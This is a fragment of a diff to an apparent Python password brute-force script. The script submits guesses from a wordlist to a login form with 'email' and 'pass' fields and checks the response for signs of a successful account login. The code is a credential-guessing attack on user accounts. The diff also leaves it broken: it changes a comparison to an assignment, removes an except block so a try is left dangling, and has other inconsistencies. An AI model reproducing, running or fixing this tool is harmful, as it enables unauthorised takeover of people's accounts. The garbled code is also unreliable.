@@ -32,7 +32,7 @@ while file:
 	print=str(i) +" : ",passwords
 	response = webbrowser.open(post_url)
 	try:
-		if response.code == 200:
+		if response.code = 200:
 			webbrowser.select_form(nr=0)
 			webbrowser.form['email'] = email
 			webbrowser.form['pass'] = passwords
@@ -41,6 +41,4 @@ while file:
 			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
 				print('Your password is : ',passwords)
 				break
-	except:
-		print('\nSleeping for time : 2 min\n')
-		time.sleep(300)
+sys.exit()
